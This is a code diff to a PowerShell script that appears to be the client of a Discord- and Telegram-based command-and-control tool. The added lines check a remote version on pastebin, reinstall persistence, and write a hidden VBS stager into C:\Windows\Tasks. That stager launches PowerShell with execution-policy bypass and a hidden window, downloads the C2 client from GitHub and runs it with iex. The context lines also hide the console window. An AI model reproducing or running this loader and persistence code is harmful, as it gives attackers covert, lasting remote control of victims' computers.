@@ -42,6 +42,34 @@ add-type -name win -member $Import -namespace native;
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
 }
 
+# Check version and update
+$version = "1.3.0"
+$versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
+$VBpath = "C:\Windows\Tasks\service.vbs"
+if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
+Write-Output "Persistance Installed - Checking Version.."
+    if (!($version -match $versionCheck)){
+        Write-Output "Newer version available! Downloading and Restarting"
+        RemovePersistance
+        AddPersistance
+        $tobat = @"
+Set WshShell = WScript.CreateObject(`"WScript.Shell`")
+WScript.Sleep 200
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+"@
+        $tobat | Out-File -FilePath $VBpath -Force
+        sleep 1
+        & $VBpath
+        exit
+    }
+}
+
+# remove restart stager (if present)
+if(Test-Path "C:\Windows\Tasks\service.vbs"){
+    rm -path "C:\Windows\Tasks\service.vbs" -Force
+}
+
+$version = "1.7.0" # Current Version
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
